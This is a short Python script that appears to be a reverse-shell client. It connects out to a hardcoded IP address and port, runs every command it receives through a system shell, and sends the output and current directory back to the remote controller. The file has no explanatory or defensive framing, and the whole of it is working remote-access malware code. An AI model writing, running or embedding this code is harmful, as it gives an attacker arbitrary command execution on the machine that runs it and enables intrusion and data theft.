import socket
import os
import subprocess

s=socket.socket()
host="10.1.135.14"
port=9997

s.connect((host,port))

while True:
    data=s.recv(1024)
    if data[:2].decode("utf-8")=='cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data)>0:
        cmd=subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
        output_bytes=cmd.stdout.read()+cmd.stderr.read()
        output=str(output_bytes,"utf-8")
        output+=os.getcwd()+" >"
        s.send(str.encode(output,"utf-8"))
        print(output)
print('hello')
